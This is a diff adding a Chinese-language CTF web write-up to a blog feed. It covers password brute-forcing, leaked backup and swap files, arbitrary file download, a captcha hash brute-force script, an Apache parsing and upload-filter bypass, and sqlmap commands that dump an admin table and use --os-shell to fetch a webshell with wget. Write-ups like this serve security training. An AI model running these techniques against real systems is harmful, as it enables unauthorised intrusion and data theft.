@@ -578,8 +578,285 @@ Angular 定义了四个安全环境 - HTML，样式，URL，和资源 URL：</p>
 			<pubDate>Mon, 26 Mar 2018 10:42:51 +0800</pubDate>
 			
 			<guid>/posts/%E6%9F%90%E5%B9%B3%E5%8F%B0ctf-web/</guid>
-			<description></description>
-			<content type="html"><![CDATA[]]></content>
+			<description>web题目wp web-1 送分题 题目地址 http://45.124.115.155:8002/bd6b406e7ab5ca24/
+访问得知是一个登录框，我们右键查看源代码得到重要信息 可以得到此登录框用户名是amdin，密码from（month/day）因此猜想密码来自日期，构造字典为所有的日期天数爆破，后来爆破无果，换成4位数字就可以，burpsite设置参数类型 爆破得出密码为 9527 因此获得flag为：flag{brute_force_attack97dsads}
+web-2 信息泄露 题目地址 http://45.124.115.155:8007/28bc0902b253f1ca/
+题目提示信息泄露，因此我们尝试找下敏感信息泄露的文件，用御剑或者别的工具扫描得到一个 www.rar
+我们访问下载，得到文件内容____查看info.txt 题目提示vim退出产生的临时文件，即vim产生临时的swp文件，因此我们访问 config,inc.swp这个文件
+拿到flag flag{8622EFE3BADA2CC28622EFE3BADA2CC2}
+web-3 抓包 题目打开后是一个链接，我们访问发现链接跳转到404，利用chrome浏览器f12开发者工具得到 我们使用burpsite抓包访问
+得到加密字符串，经过分析是base64加密，解密得到 flag为 flag{Redirection302}
+web-4 会编程吗 题目打开让我们下载文件 但是分析下载文件的链接 http://45.124.115.155:8002/732a68da659cba5b/?file=flag.txt 发现存在任意文件下载，构造链接
+http://45.124.115.155:8002/732a68da659cba5b/?file=flag.php
+下载得到flag.php文件，打开发现内容如下:
+&amp;lt;?php header(&amp;#39;Content-Type: text/html; charset=utf-8&amp;#39;); function encrypt($data, $key) { $key = md5 ( $key ); $x = 0; $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i &amp;lt; $len; $i ++) { if ($x == $l) { $x = 0; } $char .</description>
+			<content type="html"><![CDATA[
+
+<h1 id="web题目wp">web题目wp</h1>
+
+<h2 id="web-1-送分题">web-1 送分题</h2>
+
+<p>题目地址 <a href="http://45.124.115.155:8002/bd6b406e7ab5ca24/">http://45.124.115.155:8002/bd6b406e7ab5ca24/</a></p>
+
+<p>访问得知是一个登录框，我们右键查看源代码得到重要信息
+<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/3980a86f.png" alt="3980a86f.png" />
+可以得到此登录框用户名是amdin，密码from（month/day）因此猜想密码来自日期，构造字典为所有的日期天数爆破，后来爆破无果，换成4位数字就可以，burpsite设置参数类型
+<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/b4d7f102.png" alt="b4d7f102.png" />
+爆破得出密码为 <code>9527</code>
+<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/8fcdb483.png" alt="8fcdb483.png" />
+<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/7339320c.png" alt="7339320c.png" />
+因此获得flag为：<code>flag{brute_force_attack97dsads}</code></p>
+
+<h2 id="web-2-信息泄露">web-2 信息泄露</h2>
+
+<p>题目地址 <a href="http://45.124.115.155:8007/28bc0902b253f1ca/">http://45.124.115.155:8007/28bc0902b253f1ca/</a></p>
+
+<p>题目提示信息泄露，因此我们尝试找下敏感信息泄露的文件，用御剑或者别的工具扫描得到一个 www.rar</p>
+
+<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/c4b0dbdb.png" alt="c4b0dbdb.png" />我们访问下载，得到文件内容____<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/ba0bef95.png" alt="ba0bef95.png" /></p>
+
+<p>查看info.txt 题目提示vim退出产生的临时文件，即vim产生临时的swp文件，因此我们访问 config,inc.swp这个文件</p>
+
+<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/0729e0e7.png" alt="0729e0e7.png" /></p>
+
+<p>拿到flag <code>flag{8622EFE3BADA2CC28622EFE3BADA2CC2}</code></p>
+
+<h2 id="web-3-抓包">web-3 抓包</h2>
+
+<p>题目打开后是一个链接，我们访问发现链接跳转到404，利用chrome浏览器f12开发者工具得到
+<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/badb2263.png" alt="badb2263.png" /></p>
+
+<p>我们使用burpsite抓包访问</p>
+
+<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/64d6bb64.png" alt="64d6bb64.png" /></p>
+
+<p>得到加密字符串，经过分析是base64加密，解密得到
+<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/16503a1e.png" alt="16503a1e.png" /></p>
+
+<p>flag为 <code>flag{Redirection302}</code></p>
+
+<h2 id="web-4-会编程吗">web-4 会编程吗</h2>
+
+<p>题目打开让我们下载文件
+<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/78e44e86.png" alt="78e44e86.png" /></p>
+
+<p>但是分析下载文件的链接
+<a href="http://45.124.115.155:8002/732a68da659cba5b/?file=flag.txt">http://45.124.115.155:8002/732a68da659cba5b/?file=flag.txt</a>
+发现存在任意文件下载，构造链接</p>
+
+<p><a href="http://45.124.115.155:8002/732a68da659cba5b/?file=flag.php">http://45.124.115.155:8002/732a68da659cba5b/?file=flag.php</a></p>
+
+<p>下载得到<code>flag.php</code>文件，打开发现内容如下:</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Type: text/html; charset=utf-8&#39;</span><span class="p">);</span> 
+<span class="k">function</span> <span class="nf">encrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nv">$key</span> <span class="o">=</span> <span class="nx">md5</span> <span class="p">(</span> <span class="nv">$key</span> <span class="p">);</span>
+	<span class="nv">$x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="nv">$len</span> <span class="o">=</span> <span class="nx">strlen</span> <span class="p">(</span> <span class="nv">$data</span> <span class="p">);</span>
+	<span class="nv">$l</span> <span class="o">=</span> <span class="nx">strlen</span> <span class="p">(</span> <span class="nv">$key</span> <span class="p">);</span>
+	<span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$x</span> <span class="o">==</span> <span class="nv">$l</span><span class="p">)</span> <span class="p">{</span>
+			<span class="nv">$x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+		<span class="p">}</span>
+		<span class="nv">$char</span> <span class="o">.=</span> <span class="nv">$key</span> <span class="p">{</span><span class="nv">$x</span><span class="p">};</span>
+		<span class="nv">$x</span> <span class="o">++</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nv">$str</span> <span class="o">.=</span> <span class="nx">chr</span> <span class="p">(</span> <span class="nx">ord</span> <span class="p">(</span> <span class="nv">$data</span> <span class="p">{</span><span class="nv">$i</span><span class="p">}</span> <span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="nx">ord</span> <span class="p">(</span> <span class="nv">$char</span> <span class="p">{</span><span class="nv">$i</span><span class="p">}</span> <span class="p">))</span> <span class="o">%</span> <span class="mi">256</span> <span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="nx">base64_encode</span> <span class="p">(</span> <span class="nv">$str</span> <span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nv">$key</span> <span class="o">=</span> <span class="nx">md5</span> <span class="p">(</span> <span class="nv">$key</span> <span class="p">);</span>
+	<span class="nv">$x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="nv">$data</span> <span class="o">=</span> <span class="nx">base64_decode</span> <span class="p">(</span> <span class="nv">$data</span> <span class="p">);</span>
+	<span class="nv">$len</span> <span class="o">=</span> <span class="nx">strlen</span> <span class="p">(</span> <span class="nv">$data</span> <span class="p">);</span>
+	<span class="nv">$l</span> <span class="o">=</span> <span class="nx">strlen</span> <span class="p">(</span> <span class="nv">$key</span> <span class="p">);</span>
+	<span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$x</span> <span class="o">==</span> <span class="nv">$l</span><span class="p">)</span> <span class="p">{</span>
+			<span class="nv">$x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+		<span class="p">}</span>
+		<span class="nv">$char</span> <span class="o">.=</span> <span class="nx">substr</span> <span class="p">(</span> <span class="nv">$key</span><span class="p">,</span> <span class="nv">$x</span><span class="p">,</span> <span class="mi">1</span> <span class="p">);</span>
+		<span class="nv">$x</span> <span class="o">++</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nx">ord</span> <span class="p">(</span> <span class="nx">substr</span> <span class="p">(</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">)</span> <span class="o">&lt;</span> <span class="nx">ord</span> <span class="p">(</span> <span class="nx">substr</span> <span class="p">(</span> <span class="nv">$char</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">))</span> <span class="p">{</span>
+			<span class="nv">$str</span> <span class="o">.=</span> <span class="nx">chr</span> <span class="p">(</span> <span class="p">(</span><span class="nx">ord</span> <span class="p">(</span> <span class="nx">substr</span> <span class="p">(</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">)</span> <span class="o">+</span> <span class="mi">256</span><span class="p">)</span> <span class="o">-</span> <span class="nx">ord</span> <span class="p">(</span> <span class="nx">substr</span> <span class="p">(</span> <span class="nv">$char</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">)</span> <span class="p">);</span>
+		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+			<span class="nv">$str</span> <span class="o">.=</span> <span class="nx">chr</span> <span class="p">(</span> <span class="nx">ord</span> <span class="p">(</span> <span class="nx">substr</span> <span class="p">(</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">)</span> <span class="o">-</span> <span class="nx">ord</span> <span class="p">(</span> <span class="nx">substr</span> <span class="p">(</span> <span class="nv">$char</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">)</span> <span class="p">);</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="nv">$str</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nv">$key</span><span class="o">=</span><span class="s2">&#34;flag&#34;</span><span class="p">;</span>
+<span class="nv">$flag</span><span class="o">=</span><span class="s2">&#34;eod8tanEmpilpJebbQ==&#34;</span><span class="p">;</span><span class="c1">//tip: 
+</span><span class="c1"></span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div>
+<p>发现主要代码为</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">$key=&#34;flag&#34;;
+$flag=&#34;eod8tanEmpilpJebbQ==&#34;;</code></pre></div>
+<p>然后在此代码里存在 encrypt 函数和 decrypt 函数 而且 下面<code>flag</code>
+变量类似第一个加密函数加密的代码，因此增加一段代码</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">echo  decrypt($flag, $key);</code></pre></div>
+<p>运行得到解密后的值
+<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/87155efb.png" alt="87155efb.png" /></p>
+
+<p>尝试提交正确，带上flag的格式 因此得到flag的值为</p>
+
+<p><code>flag{GUETsafeup678}</code></p>
+
+<h2 id="web-5-先登录吧">web-5 先登录吧</h2>
+
+<p>题目打开是一个验证码验证程序，首先我们随便输入任意的值，我们发现了联系
+<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/60b44f48.png" alt="60b44f48.png" /></p>
+
+<p>这道题目让我们猜验证码，而且经过多次输入，正确的验证码为4位，包含数字，验证码等，因此我们可以穷举计算所有情况的哈希值然后求得正确的，写脚本如下</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="n">str_list</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;c&#39;</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span><span class="p">,</span> <span class="s1">&#39;e&#39;</span><span class="p">,</span> <span class="s1">&#39;f&#39;</span><span class="p">,</span> <span class="s1">&#39;g&#39;</span><span class="p">,</span> <span class="s1">&#39;h&#39;</span><span class="p">,</span> <span class="s1">&#39;i&#39;</span><span class="p">,</span> <span class="s1">&#39;j&#39;</span><span class="p">,</span> <span class="s1">&#39;k&#39;</span><span class="p">,</span> <span class="s1">&#39;l&#39;</span><span class="p">,</span> <span class="s1">&#39;m&#39;</span><span class="p">,</span> <span class="s1">&#39;n&#39;</span><span class="p">,</span> <span class="s1">&#39;o&#39;</span><span class="p">,</span> <span class="s1">&#39;p&#39;</span><span class="p">,</span> <span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="s1">&#39;s&#39;</span><span class="p">,</span> <span class="s1">&#39;t&#39;</span><span class="p">,</span> <span class="s1">&#39;u&#39;</span><span class="p">,</span> <span class="s1">&#39;v&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="s1">&#39;x&#39;</span><span class="p">,</span> <span class="s1">&#39;y&#39;</span><span class="p">,</span> <span class="s1">&#39;z&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="p">,</span> <span class="s1">&#39;4&#39;</span><span class="p">,</span> <span class="s1">&#39;5&#39;</span><span class="p">,</span> <span class="s1">&#39;6&#39;</span><span class="p">,</span> <span class="s1">&#39;7&#39;</span><span class="p">,</span> <span class="s1">&#39;8&#39;</span><span class="p">,</span> <span class="s1">&#39;9&#39;</span><span class="p">]</span>
+
+
+
+<span class="k">def</span> <span class="nf">md5</span><span class="p">(</span><span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">):</span>
+	<span class="n">m</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
+	<span class="k">return</span> <span class="n">m</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">):</span>
+	<span class="n">file_obj</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;code.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;a+&#34;</span><span class="p">)</span>
+	<span class="n">file_obj</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">str</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+	<span class="n">file_obj</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+
+<span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">str_list</span><span class="p">:</span>
+	<span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">str_list</span><span class="p">:</span>
+		<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">str_list</span><span class="p">:</span>
+			<span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">str_list</span><span class="p">:</span>
+				<span class="n">result</span> <span class="o">=</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span> <span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="n">d</span>
+				<span class="k">print</span> <span class="n">result</span>
+				<span class="k">print</span> <span class="s2">&#34;hash:&#34;</span> <span class="o">+</span> <span class="n">md5</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+				<span class="n">write</span><span class="p">(</span><span class="n">result</span> <span class="o">+</span> <span class="s2">&#34;   hash: &#34;</span> <span class="o">+</span> <span class="n">md5</span><span class="p">(</span><span class="n">result</span><span class="p">))</span>
+			</code></pre></div>
+<p>最后把文件写入 code.txt 然后使用命令查看
+<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/ad22e9d5.png" alt="ad22e9d5.png" /></p>
+
+<p>得到验证码为zwd4</p>
+
+<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/0585f1c5.png" alt="0585f1c5.png" /></p>
+
+<p>得到flag</p>
+
+<pre><code>flag{7a762b1b06900fa112eb46851ed42218}
+</code></pre>
+
+<h2 id="web-6-上传">web-6 上传</h2>
+
+<p>首先打开burpsite 抓包分析
+<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/34826b1e.png" alt="34826b1e.png" /></p>
+
+<p>首先看到apache2.4.18 先试试apache的解析漏洞
+利用Apache解析漏洞（CVE-2017-15715）apache在识别文件死对不识别的扩展文件会默认从右向左找可以识别的扩展文件，因此可以构造 xxx.php.fuck 这样的后缀文件，后来发现此处文件上传存在黑名单拦截，可以上传任意文件后缀的文件，因此尝试apache解析漏洞</p>
+
+<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/68d57881.png" alt="68d57881.png" /></p>
+
+<p>但是上传时对文件内容进行过滤，只要存在&lt;?就会拦截，查了下资料 php的写法可以这样写</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">language</span><span class="o">=</span><span class="s">&#34;php&#34;</span><span class="p">&gt;</span>
+  <span class="nx">phpinfo</span><span class="p">();</span>
+  <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span></code></pre></div>
+<p>因此上传狗仔这样的数据包，成功上传
+<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/a8327a8a.png" alt="a8327a8a.png" /></p>
+
+<p>拿到上传后的地址访问:
+<a href="http://45.124.115.155:8002/d5ad200397ddbd66/upload/bd_000.php.s1tr">http://45.124.115.155:8002/d5ad200397ddbd66/upload/bd_000.php.s1tr</a></p>
+
+<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/b4b756e9.png" alt="b4b756e9.png" /></p>
+
+<p>得到flag的值为: <code>flag{L0veUplo4dByPass}</code></p>
+
+<h2 id="web-6-干就完了">web-6 干就完了</h2>
+
+<p>首先访问得到一个页面，看到动态参数拼接想到注入</p>
+
+<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/c132f61b.png" alt="c132f61b.png" /></p>
+
+<p>尝试注入，发现什么也没过滤，直接使用工具 sqlmap 进行sql注入</p>
+
+<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/337ea090.png" alt="337ea090.png" /></p>
+
+<p>然后跑数据库 表名，得到了key最后尝试就是 flag</p>
+
+<p>命令 <code>python sqlmap.py -u &quot;http://45.124.115.155:8005/a4a14545663da137/news.php?id=1&quot; --batch --level 2 -v 6 --current-db --current-user --tables -D ctf001</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">Database: ctf001
+<span class="o">[</span><span class="m">3</span> tables<span class="o">]</span>
++---------+
+<span class="p">|</span> admin   <span class="p">|</span>
+<span class="p">|</span> article <span class="p">|</span>
+<span class="p">|</span> content <span class="p">|</span>
++---------+</code></pre></div>
+<p>命令 <code>python sqlmap.py -u &quot;http://45.124.115.155:8005/a4a14545663da137/news.php?id=1&quot; --batch --level 2 -v 6 --current-db --current-user --columns -T admin -D ctf001</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">Database: ctf001
+Table: admin
+<span class="o">[</span><span class="m">3</span> columns<span class="o">]</span>
++----------+------------------+
+<span class="p">|</span> Column   <span class="p">|</span> Type             <span class="p">|</span>
++----------+------------------+
+<span class="p">|</span> id       <span class="p">|</span> int<span class="o">(</span><span class="m">10</span><span class="o">)</span> unsigned <span class="p">|</span>
+<span class="p">|</span> password <span class="p">|</span> char<span class="o">(</span><span class="m">32</span><span class="o">)</span>         <span class="p">|</span>
+<span class="p">|</span> username <span class="p">|</span> varchar<span class="o">(</span><span class="m">30</span><span class="o">)</span>      <span class="p">|</span>
++----------+------------------+</code></pre></div>
+<p>命令 <code>python sqlmap.py -u &quot;http://45.124.115.155:8005/a4a14545663da137/news.php?id=1&quot; --batch --level 2 -v 6 --current-db --current-user --dump -C username,password,id -T admin -D ctf001</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">Database: ctf001
+Table: admin
+<span class="o">[</span><span class="m">3</span> entries<span class="o">]</span>
++----------------------+-----------------------------------------+----+
+<span class="p">|</span> username             <span class="p">|</span> password                                <span class="p">|</span> id <span class="p">|</span>
++----------------------+-----------------------------------------+----+
+<span class="p">|</span> admin                <span class="p">|</span> a41b97ca8f2b827d                        <span class="p">|</span> <span class="m">1</span>  <span class="p">|</span>
+<span class="p">|</span> key:d8afe41c7c64eeab <span class="p">|</span> aaaaaaa                                 <span class="p">|</span> <span class="m">2</span>  <span class="p">|</span>
+<span class="p">|</span> root                 <span class="p">|</span> 63a9f0ea7bb98050796b649e85481845 <span class="o">(</span>root<span class="o">)</span> <span class="p">|</span> <span class="m">3</span>  <span class="p">|</span>
++----------------------+-----------------------------------------+----+</code></pre></div>
+<p>拿到flag <code>flag{d8afe41c7c64eeab}</code></p>
+
+<h2 id="web-7-继续干呀">web-7 继续干呀</h2>
+
+<p>这道题目和上一道题目一样，都属于注入类型的题目，但是这道题扩展我们利用注入getshell的方法，唯一不同的是需要加上一个waf <code>tamper</code> <code>space2comment.py</code></p>
+
+<p>命令 <code>python sqlmap.py -u &quot;http://45.124.115.155:8005/a4a14545663da137/news.php?id=1&quot; --batch --level 2 -v 6 --current-user</code>
+判断当前数据库全县是否为最高管理员权限</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">current user:    root@localhost</code></pre></div>
+<p>命令 <code>python sqlmap.py -u &ldquo;<a href="http://45.124.115.155:8005/a4a14545663da137/news.php?id=1&quot;">http://45.124.115.155:8005/a4a14545663da137/news.php?id=1&quot;</a> &ndash;level 2 -v 6 &ndash;current-user &ndash;os-shell</code></p>
+
+<p>选择第四个 默认回车就行
+<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/9414e1dc.png" alt="9414e1dc.png" /></p>
+
+<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/d6b1858a.png" alt="d6b1858a.png" /></p>
+
+<p>接下来这个选项选择回车</p>
+
+<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/5be91f7f.png" alt="5be91f7f.png" /></p>
+
+<p>这个选择 n
+<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/f4293751.png" alt="f4293751.png" /></p>
+
+<p>然后就到我们的命令行了</p>
+
+<p>然后拿到shell，利用 wget 下载webshell 成功用菜刀连接</p>
+
+<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/70e8f604.png" alt="70e8f604.png" /></p>
+
+<p>成功getshell</p>
+
+<p>找到根目录一个1.txt的文件，发现这样一个文件</p>
+
+<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/7aa678e1.png" alt="7aa678e1.png" /></p>
+
+<p>看到tips ，base64解码后得到是jsfuck，于是复制下面的字符在浏览器的console控制台，得到flag
+<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/9db58bf0.png" alt="9db58bf0.png" /></p>
+
+<p><code>flag{sadjasdmasdjasdmasdjasjdasdkas}</code></p>
+]]></content>
 		</item>
 		
 	</channel>
